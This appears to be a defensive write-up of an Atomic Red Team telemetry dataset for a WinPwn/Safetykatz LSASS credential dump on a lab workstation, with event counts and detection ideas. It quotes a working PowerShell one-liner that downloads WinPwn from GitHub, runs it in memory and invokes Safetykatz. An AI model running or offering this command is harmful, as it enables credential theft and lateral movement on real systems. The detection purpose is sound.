# T1078.003-7: Local Accounts — WinPwn - Loot Local Credentials (Safetykatz)

## Technique Context

T1078.003 (Valid Accounts: Local Accounts) covers adversaries who use locally stored credentials — NTLM hashes, Kerberos tickets, or cleartext passwords cached on the endpoint — to authenticate to other systems. Safetykatz is a .NET port of Mimikatz, the seminal credential extraction tool, compiled to run as a .NET assembly that can be loaded directly into memory from a remote source. By loading a .NET assembly in-process rather than writing a binary to disk, Safetykatz avoids many file-based detection mechanisms.

WinPwn's integration of Safetykatz automates the in-memory loading and execution of the tool. WinPwn fetches the Safetykatz assembly from a GitHub repository, loads it via .NET reflection, and invokes the credential dump functions. The resulting credentials — NTLM hashes, plaintext passwords if the WDigest provider has cached them, or Kerberos ticket data — can be used for lateral movement or privilege escalation.

This test exercises that exact pattern on an undefended endpoint: WinPwn is loaded in-memory, it loads Safetykatz in-memory, and Safetykatz attempts to extract credentials from LSASS memory. With Defender disabled, nothing prevents the extraction from completing.

## What This Dataset Contains

This dataset captures the execution of WinPwn's Safetykatz credential dump on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The Security log (EID 4688) and Sysmon (EID 1) record the process creation, though the primary PowerShell invocation samples show an empty command block (`"powershell.exe" & {}`). This reflects that the Safetykatz invocation command was present in a prior execution stage that is visible in the Sysmon EID 1 events. The ART command structure for this test mirrors the other WinPwn tests:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Safetykatz -consoleoutput -noninteractive}
```

The Sysmon channel (102 events) shows: 81 EID 11 (file creates), 12 EID 7 (image loads), 3 EID 1 (process creates), 3 EID 10 (process access), 1 EID 17 (named pipe create), 1 EID 3 (network connection), and 1 EID 22 (DNS query).

The EID 10 (process access) event records PowerShell opening `whoami.exe` with `GrantedAccess: 0x1FFFFF` (PROCESS_ALL_ACCESS). This is the ART test framework context check, not the Safetykatz LSASS access — but it demonstrates that the PowerShell process in this execution context has sufficient privilege to open arbitrary processes with full access rights.

Sysmon EID 17 records a PowerShell host pipe under SYSTEM:
```
PipeName: \PSHost.134180047222947382.6844.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: NT AUTHORITY\SYSTEM
```

The Security channel (41 events) breaks down as: 37 EID 4688 (process creation), 2 EID 4799 (local group enumerated), 1 EID 4672 (special privileges assigned to new logon), and 1 EID 4624 (logon). The EID 4624 and 4672 pair represents a privileged logon event that occurred during this window — likely the SYSTEM logon for the test runner session. The 2 EID 4799 events indicate WinPwn performed some degree of group enumeration as part of its reconnaissance.

The WMI channel records EID 5860 (temporary event subscription): `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'wsmprovhost.exe'`. This is WinPwn registering a temporary WMI event subscription to monitor for WinRM host process creation — the same defensive monitoring indicator seen in T1078.003-6, confirming this is a consistent WinPwn behavioral pattern across its credential loot modules.

The file creation events are dominated by `mscorsvw.exe` writing to `C:\Windows\assembly\NativeImages_v4.0.30319_64\`, reflecting .NET NGen compilation activity. One non-assembly file write stands out: `MsMpEng.exe` writing to `C:\Windows\Temp\01dcb40a7e1c1b1c` — Defender's engine performing background scanning even in a disabled state.

Compared to the defended dataset (27 sysmon, 10 security, 51 PowerShell events), this undefended capture shows significantly more activity — the 37 EID 4688 process creation events (vs. 10 in the defended variant) indicates a much more complete execution path, with Safetykatz loading and running its full credential extraction sequence without being interrupted.

## What This Dataset Does Not Contain

The most significant artifact of Safetykatz execution — LSASS process access events (Sysmon EID 10 with `TargetImage: lsass.exe`) — is not present in the 20-event sample from the Sysmon channel. Safetykatz accesses LSASS to read credential material, and this would normally appear as an EID 10 event with a high-privilege `GrantedAccess` value against `lsass.exe`. It is possible these events exist in the full 102-event Sysmon dataset but were not selected in the 20-event sample, or that Safetykatz used an indirect access path not captured by the configured Sysmon rule.

The extracted credentials themselves (NTLM hashes, cleartext passwords) are not logged by any Windows event subsystem. They exist only in process memory and console output during execution.

No Sysmon EID 8 (CreateRemoteThread) events are present, suggesting Safetykatz used in-process .NET reflection to access LSASS rather than code injection techniques.

## Assessment

This dataset demonstrates the execution environment and behavioral context of WinPwn's Safetykatz credential dump module. The key observable indicators are the in-memory PowerShell loading pattern (`iex(downloadstring(...))`), the WMI process-start subscription event (EID 5860), the PowerShell SYSTEM execution context (EID 4688, named pipe creation), and the elevated .NET compilation activity consistent with loading a .NET assembly into memory.

The WMI 5860 event is particularly valuable as a WinPwn-specific behavioral indicator: both T1078.003-6 (obfuskittiedump) and T1078.003-7 (Safetykatz) register the same WMI temporary subscription for `wsmprovhost.exe` process starts. This is a WinPwn architectural fingerprint that appears regardless of which specific module is invoked.

The fact that Safetykatz is a .NET assembly loaded via reflection means it leaves minimal file system artifacts — no binary is written to disk, only the in-memory loading evidence in the PowerShell script block logs and the subsequent process behavior. This dataset provides the baseline telemetry for this execution pattern.

## Detection Opportunities Present in This Data

**WMI EID 5860 — Temporary WMI event subscription for wsmprovhost.exe:** WinPwn registers `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'wsmprovhost.exe'` as a temporary subscription when any of its credential modules run. This event in the WMI Operations log is a consistent WinPwn fingerprint. Normal applications do not create process-monitoring WMI subscriptions for WinRM host processes.

**Security EID 4624 + EID 4672 — Privileged logon during execution:** A logon event paired with a special privileges logon during the test execution window indicates a privileged session was established. In the context of credential tool execution running as SYSTEM, this combination warrants investigation.

**Security EID 4799 — Local group enumeration:** WinPwn's reconnaissance components enumerate local group memberships. Even Safetykatz (which primarily targets LSASS) triggers group enumeration as part of WinPwn's initialization, providing a consistent indicator across WinPwn modules.

**Sysmon EID 10 — Process access with 0x1FFFFF from PowerShell:** Full process access rights from PowerShell are captured. When paired with the SYSTEM execution context and the WinPwn invocation in the parent process command line, this confirms highly privileged execution from an offensive PowerShell framework.

**Sysmon EID 17 — Named pipe creation under SYSTEM:** The PSHost pipe created for the PowerShell process running as SYSTEM confirms non-interactive privileged execution. This is consistent across all WinPwn module executions.

**PowerShell EID 4104 — Script block logging:** Even though Safetykatz itself is a .NET assembly loaded via reflection (not PowerShell cmdlets), the WinPwn wrapper PowerShell code is captured in script block logs. The `Import-Module` and `Invoke-AtomicTest` blocks from the ART test framework are visible and provide execution context.
